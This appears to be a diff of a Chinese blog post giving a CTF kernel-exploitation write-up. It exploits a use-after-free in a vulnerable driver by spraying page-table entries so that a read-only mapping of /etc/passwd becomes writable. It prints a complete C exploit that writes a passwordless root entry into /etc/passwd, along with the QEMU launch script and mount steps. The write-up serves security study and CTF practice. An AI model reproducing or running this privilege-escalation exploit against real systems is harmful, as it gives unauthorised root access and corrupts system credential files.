 <div class="note note-primary">
             <p><strong>slab缓存</strong>释放对象时，并不会立即将整页返回伙伴系统，而是保留在<code>per-CPU</code>的<code>partial</code>列表中，以便快速重用</p> <p>不过，我们调用<code>CMD_DELETE</code>释放了所有对象</p> <p>当<code>slab缓存</code>中一个页上的所有对象都空闲后，该页会被标记为空闲，并最终归还给伙伴系统</p> 
           </div>
-
 <p><strong>然而，我们现在仍然持有其中一个obj的悬垂指针(selected)</strong></p>
 <p>随后</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">for</span> (<span class="hljs-type">size_t</span> i = <span class="hljs-number">0</span>; i &lt; SPRAY_NUM / ENTRY_PER_TABLE; i++) &#123;<br>  <span class="hljs-keyword">for</span> (<span class="hljs-type">size_t</span> j = <span class="hljs-number">1</span>; j &lt; ENTRY_PER_TABLE; j++) &#123;<br>    <span class="hljs-keyword">volatile</span> <span class="hljs-type">char</span> c;<br>    c = *PTI_TO_VIRT(<span class="hljs-number">1</span>, i, j, DELTA / <span class="hljs-number">8</span>);<br>    c = *PTI_TO_VIRT(<span class="hljs-number">1</span>, i, j, (<span class="hljs-number">0x800</span> + DELTA) / <span class="hljs-number">8</span>);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
-
 <div class="note note-info">
             <p>无论是四级页表中的哪一个，每个页表都是4KB，一共有512个索引</p> 
           </div>
-
 <p>注意，内层循环的j从索引1开始，而不是0</p>
 <p>PGD页表索引固定为1，早已分配，指向PUD</p>
 <p>PUD中我们分配了12个索引，每个索引对应一个PMD，其中又各有512个索引</p>
@@ -525,32 +524,28 @@
 <p>这个特定的PTE建立的映射中<code>/etc/passwd</code>便变为<strong>可读可写</strong>了</p>
 <p>最后，我们循环遍历所有喷射的地址，尝试向每个地址写入我们准备好的新<code>passwd</code>行</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// 101 --&gt; 111</span><br><span class="hljs-type">int</span> neko = open(<span class="hljs-string">&quot;/tmp/neko&quot;</span>, O_RDWR | O_CREAT, <span class="hljs-number">0666</span>);<br>write(neko, <span class="hljs-string">&quot;root::0:0:root:/root:/bin/sh\n&quot;</span>, <span class="hljs-number">29</span>);<br><br><span class="hljs-keyword">for</span> (<span class="hljs-type">size_t</span> i = <span class="hljs-number">0</span>; i &lt; SPRAY_NUM / ENTRY_PER_TABLE; i++) &#123;<br>  <span class="hljs-keyword">for</span> (<span class="hljs-type">size_t</span> j = <span class="hljs-number">1</span>; j &lt; ENTRY_PER_TABLE; j++) &#123;<br>    <span class="hljs-type">ssize_t</span> s;<br>    lseek(neko, <span class="hljs-number">0</span>, SEEK_SET);<br>    s = read(neko, PTI_TO_VIRT(<span class="hljs-number">1</span>, i, j, DELTA / <span class="hljs-number">8</span>), <span class="hljs-number">29</span>);<br>    <span class="hljs-keyword">if</span> (s &gt; <span class="hljs-number">0</span>) <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;wow: %ld, %ld\n&quot;</span>, i, j);<br><br>    lseek(neko, <span class="hljs-number">0</span>, SEEK_SET);<br>    read(neko, PTI_TO_VIRT(<span class="hljs-number">1</span>, i, j, (<span class="hljs-number">0x800</span> + DELTA) / <span class="hljs-number">8</span>), <span class="hljs-number">29</span>);<br>    <span class="hljs-keyword">if</span> (s &gt; <span class="hljs-number">0</span>) <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;wow: %ld, %ld (2)\n&quot;</span>, i, j);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
-
 <p>最终，必定会有一个地址被成功修改</p>
 <p>当程序退出且所有文件描述符被关闭时，被修改的文件会设置其<code>Dirty</code>标志</p>
 <p>因此，Linux内核会将修改后的内容写回磁盘，从而有效地覆盖原本是<strong>只读</strong>的<code>/etc/passwd</code>文件</p>
 <p>这里为什么用<strong>read系统调用</strong>呢?</p>
 <p>依旧引用一下原文</p>
 <figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">In some cases like use-after-free, however, we don&#x27;t know which entry is modified. Writing to an unmodified entry will result in SIGSEGV because it does not have R/W flag set. To resolve this issue, we can use syscall to write to the memory because simply return -1 when it tried to write a read-only mapping, instead of crashing.<br></code></pre></td></tr></table></figure>
-
-<h3 id="总结与exp"><a href="#总结与exp" class="headerlink" title="总结与exp"></a>总结与exp</h3><p>最后，给出完整exp</p>
+<h3 id="总结与exp">总结与exp</h3>
+<p>最后，给出完整exp</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;assert.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sched.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CMD_ALLOC   0x0268</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CMD_INC     0x0298</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CMD_SEL     0x01c1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CMD_DELETE  0x0831</span><br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">fatal</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *s)</span> &#123;<br>  perror(s);<br>  <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">pin_cpu</span><span class="hljs-params">(<span class="hljs-type">int</span> cpu)</span> &#123;<br>  <span class="hljs-type">cpu_set_t</span> <span class="hljs-built_in">set</span>;<br>  CPU_ZERO(&amp;<span class="hljs-built_in">set</span>);<br>  CPU_SET(cpu, &amp;<span class="hljs-built_in">set</span>);<br>  <span class="hljs-keyword">if</span> (sched_setaffinity(<span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">cpu_set_t</span>), &amp;<span class="hljs-built_in">set</span>))<br>    fatal(<span class="hljs-string">&quot;sched_setaffinity&quot;</span>);<br>&#125;<br><br><span class="hljs-type">int</span> fd;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">module_alloc</span> <span class="hljs-params">(<span class="hljs-type">size_t</span> index)</span> &#123; <span class="hljs-keyword">return</span> ioctl(fd, CMD_ALLOC , index); &#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">module_inc</span><span class="hljs-params">()</span> &#123; <span class="hljs-keyword">return</span> ioctl(fd, CMD_INC, <span class="hljs-number">0</span>); &#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">module_sel</span><span class="hljs-params">(<span class="hljs-type">size_t</span> index)</span> &#123; <span class="hljs-keyword">return</span> ioctl(fd, CMD_SEL, index); &#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">module_delete</span><span class="hljs-params">(<span class="hljs-type">size_t</span> index)</span> &#123; <span class="hljs-keyword">return</span> ioctl(fd, CMD_DELETE, index); &#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX_OBJ_NUM 0x100</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> OBJ_SIZE    0x800</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> OBJS_PER_SLAB 8    <span class="hljs-comment">// /sys/kernel/slab/obj/objs_per_slab</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CPU_PARTIAL   24   <span class="hljs-comment">// /sys/kernel/slab/obj/cpu_partial</span></span><br><br><span class="hljs-type">char</span>* <span class="hljs-title function_">PTI_TO_VIRT</span><span class="hljs-params">(<span class="hljs-type">size_t</span> pgd, <span class="hljs-type">size_t</span> pud, <span class="hljs-type">size_t</span> pmd, <span class="hljs-type">size_t</span> pte)</span> &#123;<br>  assert (pgd &lt; <span class="hljs-number">0x200</span> &amp;&amp; pud &lt; <span class="hljs-number">0x200</span> &amp;&amp; pmd &lt; <span class="hljs-number">0x200</span> &amp;&amp; pte &lt; <span class="hljs-number">0x200</span>);<br>  <span class="hljs-keyword">return</span> (<span class="hljs-type">void</span>*)((pgd &lt;&lt; <span class="hljs-number">39</span>) + (pud &lt;&lt; <span class="hljs-number">30</span>) + (pmd &lt;&lt; <span class="hljs-number">21</span>) + (pte &lt;&lt; <span class="hljs-number">12</span>));<br>&#125;<br><br><span class="hljs-type">void</span>* <span class="hljs-title function_">mmap_by_pti</span><span class="hljs-params">(<span class="hljs-type">size_t</span> pgd, <span class="hljs-type">size_t</span> pud, <span class="hljs-type">size_t</span> pmd, <span class="hljs-type">size_t</span> pte)</span> &#123;<br>  <span class="hljs-type">void</span> *p = (<span class="hljs-type">void</span>*)PTI_TO_VIRT(pgd, pud, pmd, pte);<br>  <span class="hljs-type">void</span> *q = mmap(p, <span class="hljs-number">0x1000</span>, PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_SHARED|MAP_FIXED, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>  assert (p == q);<br>  <span class="hljs-keyword">return</span> p;<br>&#125;<br><br><span class="hljs-type">void</span>* <span class="hljs-title function_">mmap_file_by_pti</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">size_t</span> pgd, <span class="hljs-type">size_t</span> pud, <span class="hljs-type">size_t</span> pmd, <span class="hljs-type">size_t</span> pte)</span> &#123;<br>  <span class="hljs-type">void</span> *p = (<span class="hljs-type">void</span>*)PTI_TO_VIRT(pgd, pud, pmd, pte);<br>  <span class="hljs-type">void</span> *q = mmap(p, <span class="hljs-number">0x1000</span>, PROT_READ, MAP_SHARED|MAP_FIXED, fd, <span class="hljs-number">0</span>);<br>  assert (p == q);<br>  <span class="hljs-keyword">return</span> p;<br>&#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ENTRY_PER_TABLE 512</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SPRAY_NUM 0x1800</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> DELTA 0x7f8</span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>  <span class="hljs-type">int</span> etcfd = open(<span class="hljs-string">&quot;/etc/passwd&quot;</span>, O_RDONLY);<br>  <span class="hljs-keyword">if</span> (etcfd == <span class="hljs-number">-1</span>) fatal(<span class="hljs-string">&quot;/etc/passwd&quot;</span>);<br><br>  fd = open(<span class="hljs-string">&quot;/dev/vuln&quot;</span>, O_RDWR);<br>  <span class="hljs-keyword">if</span> (fd == <span class="hljs-number">-1</span>) fatal(<span class="hljs-string">&quot;/dev/vuln&quot;</span>);<br><br>  pin_cpu(<span class="hljs-number">0</span>);<br><br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[+] Spraying objects...&quot;</span>);<br>  <span class="hljs-keyword">for</span> (<span class="hljs-type">size_t</span> i = <span class="hljs-number">0</span>; i &lt; MAX_OBJ_NUM; i++)<br>    <span class="hljs-keyword">if</span> (module_alloc(i % MAX_OBJ_NUM) != <span class="hljs-number">0</span>)<br>      fatal(<span class="hljs-string">&quot;module_alloc&quot;</span>);<br><br>  <span class="hljs-keyword">if</span> (module_sel(<span class="hljs-number">50</span>) != <span class="hljs-number">0</span>)<br>    fatal(<span class="hljs-string">&quot;module_sel&quot;</span>);<br><br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[+] Preparing pages...&quot;</span>);<br>  <span class="hljs-keyword">for</span> (<span class="hljs-type">size_t</span> i = <span class="hljs-number">0</span>; i &lt; SPRAY_NUM / ENTRY_PER_TABLE; i++) &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">size_t</span> j = <span class="hljs-number">0</span>; j &lt; ENTRY_PER_TABLE; j++) &#123;<br>      mmap_file_by_pti(etcfd, <span class="hljs-number">1</span>, i, j, DELTA / <span class="hljs-number">8</span>);<br>      mmap_file_by_pti(etcfd, <span class="hljs-number">1</span>, i, j, (<span class="hljs-number">0x800</span> + DELTA) / <span class="hljs-number">8</span>);<br>    &#125;<br>    <span class="hljs-keyword">volatile</span> <span class="hljs-type">char</span> c = *PTI_TO_VIRT(<span class="hljs-number">1</span>, i, <span class="hljs-number">0</span>, DELTA / <span class="hljs-number">8</span>);<br>  &#125;<br><br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[+] Returning page to buddy allocator&quot;</span>);<br>  <span class="hljs-keyword">for</span> (<span class="hljs-type">size_t</span> i = <span class="hljs-number">0</span>; i &lt; MAX_OBJ_NUM; i++)<br>    <span class="hljs-keyword">if</span> (module_delete(i) != <span class="hljs-number">0</span>)<br>      fatal(<span class="hljs-string">&quot;module_delete&quot;</span>);<br><br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[+] Spraying PTEs...&quot;</span>);<br>  <span class="hljs-keyword">for</span> (<span class="hljs-type">size_t</span> i = <span class="hljs-number">0</span>; i &lt; SPRAY_NUM / ENTRY_PER_TABLE; i++) &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">size_t</span> j = <span class="hljs-number">1</span>; j &lt; ENTRY_PER_TABLE; j++) &#123;<br>      <span class="hljs-keyword">volatile</span> <span class="hljs-type">char</span> c;<br>      c = *PTI_TO_VIRT(<span class="hljs-number">1</span>, i, j, DELTA / <span class="hljs-number">8</span>);<br>      c = *PTI_TO_VIRT(<span class="hljs-number">1</span>, i, j, (<span class="hljs-number">0x800</span> + DELTA) / <span class="hljs-number">8</span>);<br>    &#125;<br>  &#125;<br><br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Go&quot;</span>);<br>  <span class="hljs-keyword">if</span> (module_inc() != <span class="hljs-number">0</span>)<br>    fatal(<span class="hljs-string">&quot;module_inc&quot;</span>);<br>  <span class="hljs-keyword">if</span> (module_inc() != <span class="hljs-number">0</span>)<br>    fatal(<span class="hljs-string">&quot;module_inc&quot;</span>);<br><br>  <span class="hljs-comment">// 101 --&gt; 111</span><br>  <span class="hljs-type">int</span> neko = open(<span class="hljs-string">&quot;/tmp/neko&quot;</span>, O_RDWR | O_CREAT, <span class="hljs-number">0666</span>);<br>  write(neko, <span class="hljs-string">&quot;root::0:0:root:/root:/bin/sh\n&quot;</span>, <span class="hljs-number">29</span>);<br>  <br>  <span class="hljs-keyword">for</span> (<span class="hljs-type">size_t</span> i = <span class="hljs-number">0</span>; i &lt; SPRAY_NUM / ENTRY_PER_TABLE; i++) &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">size_t</span> j = <span class="hljs-number">1</span>; j &lt; ENTRY_PER_TABLE; j++) &#123;<br>      <span class="hljs-type">ssize_t</span> s;<br>      lseek(neko, <span class="hljs-number">0</span>, SEEK_SET);<br>      s = read(neko, PTI_TO_VIRT(<span class="hljs-number">1</span>, i, j, DELTA / <span class="hljs-number">8</span>), <span class="hljs-number">29</span>);<br>      <span class="hljs-keyword">if</span> (s &gt; <span class="hljs-number">0</span>) <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;wow: %ld, %ld\n&quot;</span>, i, j);<br><br>      lseek(neko, <span class="hljs-number">0</span>, SEEK_SET);<br>      read(neko, PTI_TO_VIRT(<span class="hljs-number">1</span>, i, j, (<span class="hljs-number">0x800</span> + DELTA) / <span class="hljs-number">8</span>), <span class="hljs-number">29</span>);<br>      <span class="hljs-keyword">if</span> (s &gt; <span class="hljs-number">0</span>) <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;wow: %ld, %ld (2)\n&quot;</span>, i, j);<br>    &#125;<br>  &#125;<br><br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;What&#x27;s up?&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
-
 <p>不同的是，这次给的<code>rootfs.zip</code>解压后是<code>rootfs.ext4</code></p>
 <p>下面是run脚本:</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/sh</span><br>qemu-img create -f qcow2 -b <span class="hljs-string">&quot;<span class="hljs-subst">$(realpath rootfs.ext4)</span>&quot;</span> -F raw /tmp/overlay.qcow2 &gt;/dev/null<br><span class="hljs-built_in">cp</span> flag.txt /tmp/flag.txt &amp;&amp; <span class="hljs-built_in">chmod</span> 666 /tmp/flag.txt<br><br>qemu-system-x86_64 \<br>    -m 64M \<br>    -nographic \<br>    -kernel bzImage \<br>    -drive file=/tmp/overlay.qcow2,format=qcow2,index=0 \<br>    -drive file=/tmp/flag.txt,format=raw,index=1 \<br>    -append <span class="hljs-string">&quot;root=/dev/sda console=ttyS0 loglevel=3 oops=panic panic=-1 slab_nomerge kaslr&quot;</span> \<br>    -no-reboot \<br>    -cpu qemu64,+smap,+smep \<br>    -monitor /dev/null<br><br><span class="hljs-built_in">rm</span> -f /tmp/flag.txt<br><span class="hljs-built_in">rm</span> -f /tmp/overlay.qcow2<br></code></pre></td></tr></table></figure>
-
 <p><code>flag.txt</code>实际上在<code>/dev/sdb</code></p>
 <p>使用下述方法挂载exp</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> <span class="hljs-built_in">mkdir</span> mnt<br><span class="hljs-built_in">sudo</span> mount rootfs.ext4 mnt<br><span class="hljs-built_in">sudo</span> <span class="hljs-built_in">cp</span> exp mnt<br><span class="hljs-built_in">sudo</span> umount mnt<br></code></pre></td></tr></table></figure>
-
 <p>最后</p>
 <p><strong>get root</strong></p>
 <p><img src="/images/141.png" srcset="/img/loading.gif" lazyload alt="如图"></p>
 <p>历时2天</p>
 <p>终于完成了本篇blog</p>
-<p>收获还是颇丰的吧…</p>
-<p>感谢阅读…</p>
+<p>收获还是颇丰的吧...</p>
+<p>感谢阅读...</p>
 
                 
               </div>
@@ -814,7 +809,7 @@
     <div class="footer-inner">
   
     <div class="footer-content">
-      <span class="footer-quote">No furry, no life!</span>
+      <span class="footer-quote">nice to meet you</span>
     </div>
   
   
